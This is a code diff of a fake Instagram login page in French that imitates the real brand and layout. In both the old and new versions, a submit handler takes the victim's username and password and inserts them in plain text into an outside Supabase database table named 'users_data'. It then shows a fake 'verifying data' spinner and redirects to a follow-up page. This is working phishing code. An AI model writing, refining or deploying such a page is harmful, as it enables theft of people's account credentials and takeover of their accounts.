@@ -1,182 +1,99 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #ffffff;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .lang-selector { font-size: 13px; color: #737373; margin-top: 10px; }
-    .main-container {
-      width: 100%;
-      max-width: 320px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin: auto 0;
-    }
-    .logo-img { width: 60px; height: 60px; margin-bottom: 25px; }
-    form { width: 100%; display: flex; flex-direction: column; gap: 10px; }
-    .input-field {
-      width: 100%;
-      background: #fafafa;
-      border: 1px solid #dbdbdb;
-      border-radius: 12px;
-      padding: 14px 12px;
-      font-size: 14px;
-      outline: none;
-      color: #262626;
-    }
-    .input-field:focus { border-color: #a8a8a8; }
-    .btn-login {
-      width: 100%;
-      background-color: #0064e0;
-      border: none;
-      border-radius: 20px;
-      color: #ffffff;
-      font-weight: 600;
-      padding: 12px;
-      font-size: 14px;
-      cursor: pointer;
-      margin-top: 5px;
-    }
-    .btn-login:disabled { opacity: 0.6; cursor: default; }
-    .forgot-password {
-      color: #000000;
-      font-size: 13px;
-      font-weight: 600;
-      text-decoration: none;
-      margin-top: 15px;
-      text-align: center;
-    }
-    .footer-container {
-      width: 100%;
-      max-width: 320px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-bottom: 10px;
-      gap: 15px;
-    }
-    .btn-create {
-      width: 100%;
-      background: transparent;
-      border: 1px solid #0064e0;
-      border-radius: 20px;
-      color: #0064e0;
-      font-weight: 600;
-      padding: 10px;
-      font-size: 14px;
-      text-decoration: none;
-      text-align: center;
-    }
-    .meta-logo { font-weight: bold; color: #0064e0; font-size: 14px; }
-    
-    /* شاشة التحقق والانتظار 10 ثوانٍ */
-    .loading-overlay {
-      display: none;
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(255, 255, 255, 0.98);
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-    }
-    .spinner {
-      width: 40px; height: 40px;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #0064e0;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 15px;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .loading-text { font-size: 15px; color: #262626; font-weight: 500; }
-  </style>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #ffffff; color: #000; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px 15px; }
+    .app-container { width: 100%; max-width: 380px; margin: 0 auto; text-align: center; min-height: 90vh; display: flex; flex-direction: column; justify-content: space-between; }
+    .content-wrap { width: 100%; }
+
+    .lang-select { font-size: 13px; color: #65676b; margin-bottom: 40px; }
+    .insta-icon-large { width: 75px; height: 75px; margin: 0 auto 35px; display: block; }
+
+    .inputs-group { margin-bottom: 12px; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #e0e0e0; border-radius: 12px; font-size: 14px; background: #fafafa; margin-bottom: 12px; outline: none; }
+    input[type="text"]:focus, input[type="password"]:focus { border-color: #a8a8a8; background: #fff; }
+
+    .btn-main { width: 100%; background-color: #0064e0; color: #fff; border: none; padding: 13px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 4px; }
+    .btn-main:active { opacity: 0.8; }
+
+    .link-forgot { display: inline-block; color: #1c1e21; font-size: 13px; font-weight: 600; text-decoration: none; margin-top: 18px; }
+
+    .footer-actions { margin-top: auto; padding-top: 20px; }
+    .btn-outline { width: 100%; background: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 11px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; text-decoration: none; display: block; margin-bottom: 18px; }
+    .meta-logo-footer { font-size: 14px; font-weight: 700; color: #0064e0; display: flex; align-items: center; justify-content: center; gap: 4px; }
+
+    .loader-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 300px; }
+    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0064e0; border-radius: 50%; width: 36px; height: 36px; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    .hidden { display: none !important; }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <div class="lang-selector">Français (France) ∨</div>
+  <div class="app-container">
+    <!-- الشاشة الأولى: تسجيل الدخول -->
+    <div id="step-1-login" class="content-wrap" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
+      <div>
+        <div class="lang-select">Français (France) ∨</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" alt="Instagram">
 
-  <div class="main-container">
-    <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+        <form id="loginForm">
+          <div class="inputs-group">
+            <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+          </div>
+          <button type="submit" class="btn-main">Se connecter</button>
+        </form>
 
-    <form id="loginForm">
-      <input type="text" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
-      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
-      <button type="submit" id="submitBtn" class="btn-login">Se connecter</button>
-    </form>
+        <a href="#" class="link-forgot">Mot de passe oublié ?</a>
+      </div>
 
-    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
-  </div>
+      <div class="footer-actions">
+        <a href="#" class="btn-outline">Créer un nouveau compte</a>
+        <div class="meta-logo-footer">∞ Meta</div>
+      </div>
+    </div>
 
-  <div class="footer-container">
-    <a href="#" class="btn-create">Créer un nouveau compte</a>
-    <div class="meta-logo">∞ Meta</div>
-  </div>
+    <!-- شاشة التحميل -->
+    <div id="step-loading" class="loader-box hidden">
+      <div class="spinner"></div>
+      <div style="font-size: 14px; color: #65676b;">Vérification des données...</div>
+    </div>
+  </div>
 
-  <!-- شاشة الانتظار -->
-  <div id="loadingOverlay" class="loading-overlay">
-    <div class="spinner"></div>
-    <div class="loading-text">Vérification des données...</div>
-  </div>
+  <script>
+    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-  <script>
-    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
-    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const emailVal = document.getElementById('username').value;
+      const passVal = document.getElementById('password').value;
 
-    const form = document.getElementById('loginForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const loadingOverlay = document.getElementById('loadingOverlay');
+      document.getElementById('step-1-login').classList.add('hidden');
+      document.getElementById('step-loading').classList.remove('hidden');
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
+      const { data } = await supabaseClient
+        .from('users_data')
+        .insert([{ email: emailVal, password: passVal }])
+        .select();
 
-      submitBtn.disabled = true;
+      if (data && data.length > 0) {
+        localStorage.setItem('currentUserId', data[0].id);
+      }
 
-      try {
-        const { data, error } = await supabaseClient
-          .from('users_data')
-          .insert([{ email: email, password: password }])
-          .select();
-
-        if (error) {
-          console.error('Database Error:', error);
-          alert('Erreur: ' + error.message);
-          submitBtn.disabled = false;
-        } else if (data && data.length > 0) {
-          localStorage.setItem('user_row_id', data[0].id);
-          
-          // عرض شاشة الانتظار
-          loadingOverlay.style.display = 'flex';
-          
-          // التوجيه لصفحة instagram-plus بعد 10 ثوانٍ
-          setTimeout(() => {
-            window.location.href = './instagram-plus.html';
-          }, 10000);
-        }
-      } catch (err) {
-        console.error('Unexpected Error:', err);
-        alert('Erreur inattendue!');
-        submitBtn.disabled = false;
-      }
-    });
-  </script>
+      setTimeout(() => {
+        window.location.href = 'code.html';
+      }, 2500);
+    });
+  </script>
 </body>
 </html>
